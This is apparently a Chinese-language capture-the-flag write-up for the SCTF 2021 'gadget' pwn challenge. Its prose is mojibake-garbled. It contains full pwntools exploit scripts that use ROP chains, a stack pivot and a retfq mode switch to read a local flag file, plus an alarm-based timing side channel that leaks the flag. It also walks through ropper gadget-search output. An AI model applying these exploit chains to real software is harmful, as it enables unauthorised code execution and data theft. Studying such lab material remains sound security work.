<p>ç¬¬ä¸‰æ­¥æŠŠalarmå‡½æ•°çš„ropå†™å…¥bssæ®µç„¶åè®¡æ—¶ï¼ˆæ³¨æ„ä¸èƒ½åœ¨ç¬¬äºŒæ­¥å°±æŠŠalarmå‡½æ•°çš„ropå°±å†™å…¥æ ˆä¸­ï¼Œè¿™æ ·åšçš„è¯æˆ‘ä»¬å°±ä¸èƒ½çŸ¥é“alarmå‡½æ•°åˆ°åº•æ˜¯ä»€ä¹ˆæ—¶å€™è°ƒç”¨çš„ï¼Œå› ä¸ºå‰é¢æ‰§è¡Œäº†å¥½å¤šä»£ç äº†ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">   payload+=p64(push_rsi_ret)</span><br><span class="line">   sh.send(payload)</span><br><span class="line">   start=time.time()</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       sh.recv()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       end=time.time()</span><br><span class="line">       asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">       <span class="keyword">global</span> flag</span><br><span class="line">       flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">       <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    gdb.attach(sh,<span class="string">&quot;b *0x0000000000409d1c&quot;</span>)</span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(push_rsi_ret)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    start=time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        end=time.time()</span><br><span class="line">        asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">         pwn(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="è¿è¡Œæ•ˆæœ-è·‘äº†å¿«ä¸€ä¸ªå°æ—¶"><a href="#è¿è¡Œæ•ˆæœ-è·‘äº†å¿«ä¸€ä¸ªå°æ—¶" class="headerlink" title="è¿è¡Œæ•ˆæœ(è·‘äº†å¿«ä¸€ä¸ªå°æ—¶)"></a>è¿è¡Œæ•ˆæœ(è·‘äº†å¿«ä¸€ä¸ªå°æ—¶)</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220119231414100.png" alt="image-20220119231414100"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220119231430907.png" alt="image-20220119231430907"></p>
<p>æ‹¼æ¥å¾—åˆ°flag</p>
<h2 id="å·¥å…·ä»‹ç»â€“ropper"><a href="#å·¥å…·ä»‹ç»â€“ropper" class="headerlink" title="å·¥å…·ä»‹ç»â€“ropper"></a>å·¥å…·ä»‹ç»â€“ropper</h2><p>ä¸“é—¨ç”¨æ¥æ‰¾gadgetçš„å·¥å…·ï¼Œå¤§éƒ¨åˆ†æ—¶é—´æ¯”ROPgadgetå¥½ç”¨</p>
<p>å¯åŠ¨å¹¶è½½å…¥ç¨‹åº</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ ropper</span><br><span class="line"><span class="meta">(ropper)&gt;</span><span class="bash"> file ./gadget</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] File loaded.</span><br></pre></td></tr></table></figure>

<p>æœç´¢çš„æ—¶å€™å¯ä»¥ç›´æ¥æœè‡ªå·±æƒ³è¦çš„gadget,ä¹Ÿå¯ä»¥ä½¿ç”¨search+gadget,æ¨¡ç³Šæœç´¢çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ï¼Ÿï¼Œå¦‚ä¸‹å›¾</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Searching for gadgets: pop rdi</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop r?i</span></span><br><span class="line">[INFO] Searching for gadgets: pop r?i</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line">0x0000000000407ca5: pop rsi; mov eax, 0xca; mov rdi, r9; syscall; </span><br><span class="line">0x0000000000402be2: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000401732: pop rsi; pop r15; pop rbp; ret; </span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="å¯»æ‰¾gadget"><a href="#å¯»æ‰¾gadget" class="headerlink" title="å¯»æ‰¾gadget"></a>å¯»æ‰¾gadget</h3><p>æ€è·¯ä¸€èˆ¬å¤§å®¶éƒ½èƒ½æƒ³åˆ°ï¼Œä½†åœ¨ä¸èƒ½shellcodeçš„è¯æœ€é‡è¦çš„å°±æ˜¯å¯»æ‰¾åˆé€‚çš„gadgetæ¥æ„é€ æ”»å‡»é“¾äº†ã€‚gadgetä¸€èˆ¬æ˜¯åˆ©ç”¨æ ˆè¿›è¡Œå€¼çš„ä¼ é€’ç„¶åè°ƒç”¨å‡½æ•°ï¼Œæ ¹æ®è¿™ä¸ªç‰¹æ€§æˆ‘æŠŠgadgetåˆ†ä¸ºå››ç±»</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç±»åˆ©ç”¨popä¼ å€¼</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop|ret</span></span><br><span class="line">[INFO] Searching for gadgets: pop|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x000000000040288d: pop r12; pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040172f: pop r12; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040288f: pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000402be1: pop r14; pop r15; jmp rax; </span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç±»åˆ©ç”¨movä¼ å€¼ï¼ˆè¿™é“é¢˜å°±ç”¨åˆ°äº†ï¼‰</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search mov|ret</span></span><br><span class="line">[INFO] Searching for gadgets: mov|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000404cbb: mov ah, 0x86; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x8cbe; </span><br><span class="line">0x000000000040150c: mov ah, 0x8a; push rbp; fdivrp st(6); ret 0xf01; </span><br><span class="line">0x00000000004020f9: mov al, 0x40; add byte ptr [rsi + 0x8002], bh; syscall; </span><br><span class="line">0x000000000040213e: mov al, 0x94; je 0x2151; mov byte ptr [rbx + 0xb2353d], 0; or cl, byte ptr [rdi]; pushfq; ret 0x43bf; </span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰ç±»åˆ©ç”¨å¯„å­˜å™¨åŠ callå‡½æ•°è°ƒç”¨</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search call r??</span></span><br><span class="line">[INFO] Searching for gadgets: call r??</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000402c0a: call r14; mov edi, eax; call 0x1010; ret; </span><br><span class="line">0x0000000000402c0b: call rsi; </span><br><span class="line">0x0000000000402c0b: call rsi; mov edi, eax; call 0x1010; ret; </span><br><span class="line">ç¬¬å››ç±»ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€èˆ¬å½¢å¼æ˜¯syscall;ret æˆ–è€…int80;ret</span><br><span class="line">x0000000000401165: syscall; pop rbp; ret; </span><br><span class="line">0x0000000000408865: syscall; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search int 0x80</span></span><br><span class="line">[INFO] Searching for gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x00000000004011f3: int 0x80; </span><br><span class="line">0x00000000004011f3: int 0x80; ret; </span><br></pre></td></tr></table></figure>

<p>ropçš„æ—¶å€™å°±æœç´¢è¿™å››ç±»å°±å¥½äº†ã€‚</p>
<h2 id="ä¸åˆ©ç”¨alarmè¿›è¡Œä¾§ä¿¡é“çˆ†ç ´"><a href="#ä¸åˆ©ç”¨alarmè¿›è¡Œä¾§ä¿¡é“çˆ†ç ´" class="headerlink" title="ä¸åˆ©ç”¨alarmè¿›è¡Œä¾§ä¿¡é“çˆ†ç ´"></a>ä¸åˆ©ç”¨alarmè¿›è¡Œä¾§ä¿¡é“çˆ†ç ´</h2><p>åœ¨å•çº¿ç¨‹çš„æƒ…å†µä¸‹ä½¿ç”¨alarmè¿›è¡Œä¾§ä¿¡é“çˆ†ç ´ååˆ†ä¹‹æ…¢ï¼Œä¸Šé¢æˆ‘å†™çš„é‚£ä¸ªè„šæœ¬è¦è·‘å‡ºå…¨éƒ¨çš„flagå¤§æ¦‚éœ€è¦å¿«ä¸€ä¸ªå°æ—¶ï¼Œå°è¯•è·‘äº†ä¸€ä¸‹åˆ«äººçš„åˆ©ç”¨gadgetè¿›è¡Œçˆ†ç ´é€Ÿåº¦å¿«å¤šäº†ï¼Œæ‰€ä»¥æ‰“ç®—å­¦ä¹ ä¸€æ³¢ã€‚</p>
<p>ä¾§ä¿¡é“çš„ç²¾é«“å°±æ˜¯ä¸åŒçš„æ¯”è¾ƒç»“æœä¼šå½±å“ç¨‹åºæµï¼Œæˆ‘ä¹ˆå¯ä»¥ä½¿ç”¨è„šæœ¬æ¢æµ‹ç¨‹åºæµçš„çŠ¶å†µï¼Œä»è€Œè¾¾åˆ°æ¨æµ‹æ¯”ä»·ç»“æœå¾—åˆ°flagã€‚</p>
<p>é—®äº†ayoungä½¬ä»–çš„gadgetï¼Œåœ¨åˆæœŸç†è§£ä¸Šå‡ºç°äº†ä¸€ç‚¹é—®é¢˜ï¼Œæˆ‘ä¸€ç›´æ²¡ææ‡‚cmpä»¥åçš„æ¯”è¾ƒç»“æœåˆ°åº•ä½“ç°åœ¨å“ªé‡Œï¼ŒåŠ¨æ€è°ƒè¯•ä»¥åæ‰ææ‡‚ä½“ç°åœ¨cmovnzæŒ‡ä»¤ä¸Šï¼Œæ¯”å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmp     rax, [r15+38h]</span><br><span class="line">mov     eax, 0CD2CFCA4h</span><br><span class="line">mov     ecx, 0DF6F8009h</span><br><span class="line">cmovnz  eax, ecx</span><br><span class="line">jmp     loc_409269</span><br></pre></td></tr></table></figure>

<p>å½“cmpä¸ç›¸ç­‰çš„æ—¶å€™ecxä¼ å€¼ç»™eaxï¼Œç›¸ç­‰çš„æ—¶å€™ä¸ä¼ å€¼ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨å¯¹åé¢çš„ç¨‹åºæµæœ‰å½±å“ï¼Œç›¸ç­‰çš„æ—¶å€™ç¨‹åºé™·å…¥å¾ªç¯ï¼Œä¸ç›¸ç­‰çš„æ—¶å€™ç¨‹åºæŠ¥é”™é€€å‡ºå¯ä»¥ç”¨recv()å¯¹ç¨‹åºçŠ¶æ€è¿›è¡Œæ£€æµ‹ã€‚</p>
<p>æˆ‘çš„è„šæœ¬æ˜¯åŸºäºæˆ‘åŸå…ˆè„šæœ¬ä¿®æ”¹çš„ï¼ˆæ‡’ï¼‰ï¼Œç”±äºæ”¹çš„æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´æˆ‘å¯¹ç¨‹åºçš„ropæ§åˆ¶å‡ºç°äº†é—®é¢˜ï¼Œå¤šæ¬¡åŠ¨æ€è°ƒè¯•æ‰æ‰¾è§æ–‡ä»¶ï¼Œå“ã€‚æµªè´¹äº†ä¸€ä¸‹åˆã€‚ä¸‹é¢å°±æ˜¯ç¼ç¼è¡¥è¡¥çš„è„šæœ¬äº†ã€‚é€Ÿåº¦è™½ç„¶å¿«äº†ä½†æ˜¯æˆåŠŸç‡ä¸æ˜¯å¾ˆé«˜ğŸ¤¦â€â™€ï¸ï¼Œåº”è¯¥è·Ÿæˆ‘é¢‘ç¹çš„ä½¿ç”¨redå‡½æ•°æœ‰å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span 